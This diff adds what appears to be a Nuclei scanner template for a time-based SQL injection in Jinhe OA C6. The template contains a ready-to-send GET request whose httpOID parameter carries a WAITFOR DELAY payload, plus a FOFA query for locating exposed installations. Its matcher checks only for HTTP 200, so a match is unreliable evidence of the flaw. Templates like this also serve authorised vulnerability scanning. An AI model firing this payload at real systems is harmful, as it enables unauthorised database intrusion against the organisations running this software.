@@ -1,0 +1,23 @@
+id: poc-tbklk8s96biunzli
+info:
+  name: 金和OA-C6 IncentivePlanFulfillAppprove sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tbklk8s96biunzli'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tbklk8s96biunzli
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
